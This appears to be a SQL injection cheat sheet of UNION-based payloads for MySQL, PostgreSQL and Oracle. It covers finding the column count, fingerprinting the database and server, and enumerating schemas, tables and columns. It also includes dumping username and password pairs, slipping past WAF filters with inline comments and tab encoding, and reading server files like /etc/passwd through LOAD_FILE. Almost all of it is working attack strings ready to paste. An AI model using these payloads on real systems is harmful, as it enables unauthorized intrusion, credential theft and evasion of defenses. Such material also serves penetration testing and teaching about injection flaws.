
## MySQL 

```sql
/* === Detecting the Number of Columns === */
' ORDER BY 1 -- -                     -- No error: at least 1 column
' ORDER BY 2 -- -                     -- No error: at least 2 columns
' ORDER BY 3 -- -                     -- Error: only 2 columns exist

' UNION SELECT NULL -- -              -- Error: more columns expected
' UNION SELECT NULL, NULL -- -        -- No error: 2 columns confirmed
' UNION SELECT 1,2 -- -               -- Use numbered values to identify reflected columns

/* === Determining Column Data Types === */
' UNION SELECT 'abc', NULL -- -             -- Test if first column accepts string
' UNION SELECT NULL, 123 -- -               -- Test if second column accepts integer
' UNION SELECT NULL, '2023-01-01' -- -      -- Test if second column accepts date

/* === Extracting System Information === */
' UNION SELECT NULL, DATABASE() -- -        -- Get current database name
' UNION SELECT NULL, VERSION() -- -         -- Get MySQL version
' UNION SELECT NULL, USER() -- -            -- Get current database user
' UNION SELECT NULL, @@hostname -- -        -- Get server hostname
' UNION SELECT NULL, @@datadir -- -         -- Get MySQL data directory

/* === Listing Databases === */
' UNION SELECT NULL, GROUP_CONCAT(schema_name) FROM information_schema.schemata -- -

/* === Listing Tables from a Specific Database === */
' UNION SELECT NULL, GROUP_CONCAT(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'target_db' -- -

/* === Listing Columns from a Specific Table === */
' UNION SELECT NULL, GROUP_CONCAT(column_name) 
FROM information_schema.columns 
WHERE table_schema = 'target_db'
AND table_name = 'target_table' -- -

/* === Dumping Column Data Concatenated === */
' UNION SELECT NULL, GROUP_CONCAT(column_name SEPARATOR ', ') FROM target_db.target_table -- -

/* === Dumping Specific Columns Concatenated (e.g., username and password) === */
' UNION SELECT NULL, GROUP_CONCAT(CONCAT(username, ':', password) SEPARATOR ',') FROM users -- -

/* === Dumping Specific Columns Without Concatenation (one row per result) === */
' UNION SELECT username, password FROM users LIMIT 10 -- -

/* === Listing Table:Column Pairs === */
' UNION SELECT NULL, GROUP_CONCAT(CONCAT(table_name, ':', column_name) SEPARATOR '\n') 
FROM information_schema.columns 
WHERE table_schema = 'target_db' -- -

/* === Paginating Results === */
' UNION SELECT NULL, table_name 
FROM information_schema.tables 
LIMIT 1 OFFSET 0 -- -

' UNION SELECT NULL, table_name 
FROM information_schema.tables 
LIMIT 1 OFFSET 1 -- -

/* === Finding Reflected Columns === */
' UNION SELECT 'visible', NULL -- -         -- If 'visible' appears in output, column 1 is reflected
' UNION SELECT NULL, 'test' -- -            -- If 'test' appears, column 2 is reflected

/* === Bypassing Filters / WAFs === */
'UnIOn/**/SeLeCT/**/NULL,NULL -- -          -- Bypass with inline comments
' UNION%09SELECT%09NULL,NULL -- -           -- Bypass using tab characters
' UNION/*!50000SELECT*/NULL,NULL -- -       -- MySQL versioned comment injection

/* === Special Functions and File Reads === */
' UNION SELECT NULL, @@version_compile_os -- -      -- OS version (e.g., Linux)
' UNION SELECT NULL, LOAD_FILE('/etc/passwd') -- -  -- Read server file (if allowed)
```

## PostgreSQL 

```sql
/* === Detecting the Number of Columns === */
' ORDER BY 1 --                      -- No error: at least 1 column
' ORDER BY 2 --                      -- No error: at least 2 columns
' ORDER BY 3 --                      -- Error: only 2 columns exist

' UNION SELECT NULL --               -- Error: more columns expected
' UNION SELECT NULL, NULL --         -- No error: 2 columns confirmed
' UNION SELECT 1,2 --                -- Use numbered values to identify reflected columns

/* === Determining Column Data Types === */
' UNION SELECT 'abc', NULL --        -- Test if first column accepts string
' UNION SELECT NULL, 123 --          -- Test if second column accepts integer
' UNION SELECT NULL, DATE '2023-01-01' --  -- Test if second column accepts date

/* === Extracting System Information === */
' UNION SELECT NULL, current_database() --     -- Get current database name
' UNION SELECT NULL, version() --              -- Get PostgreSQL version
' UNION SELECT NULL, current_user --           -- Get current DB user
' UNION SELECT NULL, inet_server_addr() --     -- Get server IP (if available)

/* === Listing Databases === */
' UNION SELECT NULL, string_agg(datname, ', ') FROM pg_database ---

/* === Listing Tables from the Public Schema === */
' UNION SELECT NULL, string_agg(table_name, ', ') 
FROM information_schema.tables 
WHERE table_schema = 'public' ---

/* === Listing Columns from a Specific Table === */
' UNION SELECT NULL, string_agg(column_name, ', ') 
FROM information_schema.columns 
WHERE table_schema = 'public' 
AND table_name = 'target_table' ---

/* === Dumping Column Data Concatenated === */
' UNION SELECT NULL, string_agg(column_name::text, ', ') FROM target_table ---

/* === Dumping Specific Columns Without Concatenation (one row per result) === */
' UNION SELECT username, password FROM users LIMIT 10 ---

/* === Listing Table:Column Pairs === */
' UNION SELECT NULL, string_agg(table_name || ':' || column_name, E'\n') 
FROM information_schema.columns 
WHERE table_schema = 'public' ---

/* === Paginating Results === */
' UNION SELECT NULL, table_name 
FROM information_schema.tables 
LIMIT 1 OFFSET 0 ---

' UNION SELECT NULL, table_name 
FROM information_schema.tables 
LIMIT 1 OFFSET 1 ---

/* === Finding Reflected Columns === */
' UNION SELECT 'visible', NULL --       -- If 'visible' appears in output, column 1 is reflected
' UNION SELECT NULL, 'test' --          -- If 'test' appears, column 2 is reflected

/* === Bypassing Filters / WAFs === */
'UnIOn/**/SeLeCT/**/NULL,NULL --       -- Bypass with inline comments
' UNION%09SELECT%09NULL,NULL --         -- Bypass using tab characters

/* === Special Functions and File Reads === */
/* PostgreSQL cannot read arbitrary files directly like MySQL's LOAD_FILE,
   but you can try functions like pg_read_file if you have superuser access */
' UNION SELECT NULL, version() --       -- PostgreSQL version info
```

## Oracle
```sql
/* === Detecting the Number of Columns === */
' ORDER BY 1 --                      -- No error: at least 1 column
' ORDER BY 2 --                      -- No error: at least 2 columns
' ORDER BY 3 --                      -- Error: only 2 columns exist

' UNION SELECT NULL FROM dual --     -- Error: more columns expected (1 column in SELECT)
' UNION SELECT NULL, NULL FROM dual --  -- No error: 2 columns confirmed
' UNION SELECT 1,2 FROM dual --      -- Use numbered values to identify reflected columns

/* === Determining Column Data Types === */
' UNION SELECT 'abc', NULL FROM dual --      -- Test if first column accepts string
' UNION SELECT NULL, 123 FROM dual --        -- Test if second column accepts integer
' UNION SELECT NULL, TO_DATE('2023-01-01','YYYY-MM-DD') FROM dual -- Test if date accepted

/* === Extracting System Information === */
' UNION SELECT NULL, SYS_CONTEXT('USERENV','DB_NAME') FROM dual --   -- Current DB name
' UNION SELECT NULL, banner FROM v$version WHERE rownum=1 --       -- Oracle version banner
' UNION SELECT NULL, USER FROM dual --                             -- Current user

/* === Listing Tables (All Accessible) === */
' UNION SELECT table_name, NULL FROM all_tables WHERE ROWNUM <= 10 -- List tables

/* === Listing Columns from a Specific Table === */
' UNION SELECT column_name, NULL FROM all_tab_columns 
WHERE table_name = 'TARGET_TABLE' AND ROWNUM <= 10 -- List columns

/* === Dumping Specific Columns Without Concatenation === */
' UNION SELECT username, password FROM users WHERE ROWNUM <= 10 -- Dump data

/* === Finding Reflected Columns === */
' UNION SELECT 'visible', NULL FROM dual --      -- If 'visible' appears in output, column 1 is reflected
' UNION SELECT NULL, 'test' FROM dual --         -- If 'test' appears, column 2 is reflected

/* === Bypassing Filters / WAFs === */
'UnIOn/**/SeLeCT/**/NULL,NULL FROM dual --       -- Bypass with inline comments
' UNION%09SELECT%09NULL,NULL FROM dual --         -- Bypass using tab characters

/* === Special Functions and File Reads === */
/* Oracle can read files using UTL_FILE or external procedures, but not directly in SQL injection */
/* However, you can try dumping banner or version info as above */
```